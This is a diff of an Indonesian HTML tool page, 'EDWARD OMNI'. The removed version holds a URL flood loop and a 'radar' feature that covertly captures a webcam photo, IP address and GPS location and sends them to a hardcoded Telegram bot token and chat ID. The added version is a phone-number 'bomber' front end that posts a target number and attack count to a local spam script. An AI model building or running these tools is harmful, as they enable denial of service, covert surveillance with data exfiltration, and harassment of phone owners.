@@ -3,144 +3,48 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EDWARD OMNI V.50.7</title>
+    <title>EDWARD OMNI V.51.0</title>
     <style>
-        :root { --neon: #00ff88; --bg: #050a0e; --card-bg: rgba(15, 25, 35, 0.7); --safe: #00ffa3; --purple: #8a2be2; --red: #ff4757; }
-        * { box-sizing: border-box; transition: 0.3s; }
-        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin:0; padding: 20px; }
-        
-        .master-header { text-align: center; margin-bottom: 30px; }
-        .master-name { font-size: 28px; font-weight: 800; letter-spacing: 2px; background: linear-gradient(to right, #00ff88, #00bdff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin: 0; }
-        .version-tag { font-size: 11px; color: var(--neon); border: 1px solid var(--neon); padding: 3px 12px; border-radius: 20px; text-transform: uppercase; margin-top: 5px; display: inline-block; }
-
-        .card { background: var(--card-bg); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 20px; margin-bottom: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        h3 { margin: 0 0 15px 0; font-size: 11px; color: rgba(255,255,255,0.6); letter-spacing: 1.5px; text-transform: uppercase; }
-        
-        input { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; color: #fff; padding: 12px 15px; width: 100%; margin-bottom: 15px; font-size: 14px; outline: none; }
-        input:focus { border-color: var(--neon); background: rgba(255,255,255,0.1); }
-
-        .btn { width: 100%; padding: 15px; border-radius: 12px; border: none; cursor: pointer; font-weight: 700; text-transform: uppercase; font-size: 12px; display: flex; align-items: center; justify-content: center; gap: 8px; }
-        .btn-safe { background: linear-gradient(45deg, #00ff88, #00bdff); color: #000; }
-        .btn-phish { background: linear-gradient(45deg, var(--purple), #ff00cc); color: #fff; }
-        .btn-radar { background: transparent; color: var(--neon); border: 2px solid var(--neon); }
-
-        #scanStatus { display: none; margin-top: 15px; font-size: 16px; text-align: center; padding: 15px; border-radius: 12px; font-weight: bold; }
-        .status-safe { background: rgba(0,255,163,0.1); border: 1px solid var(--safe); color: var(--safe); }
-        .status-danger { background: rgba(255,71,87,0.1); border: 1px solid var(--red); color: var(--red); box-shadow: 0 0 20px rgba(255,71,87,0.3); }
-        
-        /* KILLER LOG STYLE */
-        #killerLog { display: none; margin-top: 15px; background: #000; border-radius: 12px; padding: 15px; font-family: 'Courier New', monospace; font-size: 10px; border: 1px solid #222; height: 150px; overflow-y: auto; color: #0f0; }
-        .log-entry { margin-bottom: 4px; border-bottom: 1px solid #111; padding-bottom: 2px; }
-        .log-success { color: var(--neon); }
-
-        #radarOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(5,10,14,0.95); z-index: 9999; flex-direction: column; align-items: center; justify-content: center; backdrop-filter: blur(15px); }
-        .radar-box { width: 200px; height: 200px; border-radius: 50%; border: 2px solid var(--neon); position: relative; }
-        .sweep { position: absolute; width: 50%; height: 50%; background: linear-gradient(45deg, var(--neon), transparent); transform-origin: bottom right; animation: sweep 1.5s linear infinite; border-radius: 0 100% 0 0; }
-        @keyframes sweep { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
-        canvas, video { display: none; }
+        :root { --neon: #00ff88; --bg: #050a0e; --red: #ff4757; }
+        body { background: var(--bg); color: #fff; font-family: sans-serif; padding: 20px; text-align: center; }
+        .card { background: rgba(255,255,255,0.05); border-radius: 20px; padding: 20px; border: 1px solid var(--neon); box-shadow: 0 0 20px rgba(0,255,136,0.2); }
+        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 10px; border: none; background: #1a1a1a; color: #fff; }
+        .btn-spam { background: linear-gradient(45deg, var(--red), #ff00cc); color: #fff; width: 100%; padding: 15px; border-radius: 12px; border: none; font-weight: bold; cursor: pointer; text-transform: uppercase; }
+        #log { margin-top: 15px; font-size: 11px; color: var(--neon); text-align: left; height: 120px; overflow: auto; background: #000; padding: 10px; border-radius: 10px; display: none; border: 1px solid #333; }
     </style>
 </head>
 <body>
-
-    <div class="master-header">
-        <p class="master-name">EDWARD OMNI</p>
-        <span class="version-tag">STABLE V.50.7 - KILLER LOG</span>
-    </div>
-
+    <h2 style="color:var(--neon)">EDWARD OMNI V.51.0</h2>
     <div class="card">
-        <h3>🛡️ CLOUD SCANNER</h3>
-        <input type="text" id="scanInput" placeholder="Tempel link di sini...">
-        <button class="btn btn-safe" onclick="cekLink()">⚡ SCAN LINK</button>
-        <div id="scanStatus"></div>
+        <p style="font-size: 12px; color: #aaa;">INTERNAL TERMUX ENGINE ACTIVATED</p>
+        <input type="number" id="targetNo" placeholder="Target (Contoh: 895429505000)">
+        <input type="number" id="jumlah" placeholder="Jumlah Serangan (Max 999)">
+        <button class="btn-spam" onclick="kirimSerangan()">LUNCURKAN SERANGAN 💣</button>
+        <div id="log"></div>
     </div>
-
-    <div class="card">
-        <h3>🔥 KILLER FLOOD (MULTI-THREAD)</h3>
-        <input type="text" id="targetUrl" placeholder="https://link-phising-target.com">
-        <button class="btn btn-phish" id="atkBtn" onclick="toggleAtk()">EXECUTE FLOOD 🚀</button>
-        <div id="killerLog"></div>
-    </div>
-
-    <div class="card">
-        <h3>📡 SATELLITE RADAR</h3>
-        <button class="btn btn-radar" onclick="startRadar()">AKTIFKAN RADAR</button>
-    </div>
-
-    <div id="radarOverlay">
-        <div class="radar-box"><div class="sweep"></div></div>
-        <p style="margin-top:25px; font-size:11px; color:var(--neon);">MENGAMBIL DATA KOORDINAT...</p>
-    </div>
-
-    <canvas id="canvas"></canvas>
-    <video id="v" autoplay playsinline></video>
 
     <script>
-        const TOKEN = '8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g';
-        const CHAT_ID = '7898572558';
-        let isAtk = false, atkInt;
+        async function kirimSerangan() {
+            const no = document.getElementById('targetNo').value;
+            const jum = document.getElementById('jumlah').value;
+            const log = document.getElementById('log');
+            if(!no || !jum) return alert("Isi Target & Jumlah!");
 
-        const keywords = ['dana', 'kaget', 'klaim', 'giveaway', 'hadiah', 'login', 'verifikasi', 'fb', 'ig', 'bank', 'prakerja', 'bansos', 'whatsapp'];
-        const suspiciousExt = ['.top', '.xyz', '.tk', '.site', '.info', '.online', '.uno', '.ga', '.cf'];
+            log.style.display = "block";
+            log.innerHTML = "> Menghubungkan ke Termux...<br>";
 
-        function cekLink() {
-            const url = document.getElementById('scanInput').value.toLowerCase();
-            const status = document.getElementById('scanStatus');
-            if(!url) return;
-            status.style.display = "block"; status.className = ""; status.innerText = "MENGANALISA...";
-            setTimeout(() => {
-                const isBad = keywords.some(w => url.includes(w)) || suspiciousExt.some(e => url.includes(e));
-                if(isBad) { status.className = "status-danger"; status.innerText = "INI LINK PHISING"; }
-                else { status.className = "status-safe"; status.innerText = "INI AMAN"; }
-            }, 2000);
-        }
-
-        function addLog(msg) {
-            const log = document.getElementById('killerLog');
-            const entry = document.createElement('div');
-            entry.className = "log-entry log-success";
-            entry.innerText = "> [" + new Date().toLocaleTimeString() + "] " + msg;
-            log.prepend(entry);
-            if (log.childNodes.length > 50) log.removeChild(log.lastChild);
-        }
-
-        function toggleAtk() {
-            const u = document.getElementById('targetUrl').value;
-            const logBox = document.getElementById('killerLog');
-            if(!u) return;
-            if(!isAtk) {
-                isAtk = true;
-                logBox.style.display = "block";
-                document.getElementById('atkBtn').innerText = "STOP FLOOD";
-                atkInt = setInterval(() => { 
-                    for(let i=0; i<5; i++){ 
-                        fetch(u, {mode:'no-cors', cache:'no-cache'}).catch(()=>{}); 
-                        addLog("PACKET SENT TO " + u.substring(0, 25) + "...");
-                    } 
-                }, 500);
-            } else { location.reload(); }
-        }
-
-        async function startRadar() {
-            document.getElementById('radarOverlay').style.display = 'flex';
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('v'); video.srcObject = stream;
-                setTimeout(async () => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
-                    const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', blob);
-                    fetch("https://api.telegram.org/bot"+TOKEN+"/sendPhoto", { method: "POST", body: fd });
-                    const ipR = await fetch('https://api.ipify.org?format=json');
-                    const ipD = await ipR.json();
-                    navigator.geolocation.getCurrentPosition((p) => {
-                        let m = "🔱 [ EDWARD LOG ] 🔱\n🌐 IP: "+ipD.ip+"\n📍 LOC: http://googleusercontent.com/maps?q="+p.coords.latitude+","+p.coords.longitude;
-                        fetch("https://api.telegram.org/bot"+TOKEN+"/sendMessage?chat_id="+CHAT_ID+"&text="+encodeURIComponent(m));
-                    }, null, {enableHighAccuracy:true});
-                    location.reload();
-                }, 3000);
-            } catch (e) { location.reload(); }
+                const response = await fetch('http://localhost:5000/spam', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ target: no, jumlah: jum })
+                });
+                const res = await response.json();
+                log.innerHTML += "> STATUS: " + res.message + " 🔥";
+            } catch (e) {
+                log.innerHTML += "> ERROR: Jalankan 'python bomber.py' di Termux!";
+                log.style.color = "red";
+            }
         }
     </script>
 </body>
